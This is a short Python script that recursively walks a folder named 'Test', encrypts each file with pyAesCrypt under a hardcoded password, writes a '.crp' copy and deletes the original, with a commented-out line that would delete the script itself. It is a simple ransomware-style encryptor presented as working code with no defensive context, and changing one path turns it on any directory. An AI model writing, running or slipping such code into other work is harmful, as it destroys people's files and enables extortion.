import sys, os, pyAesCrypt


def crypt(file):
	password = "h"
	bufferSize = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file)+".crp", password, bufferSize)
	print("Encrypted")
	os.remove(file)
        
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)
                
    
walk("Test")
#os.remove(str(sys.argv[0]))

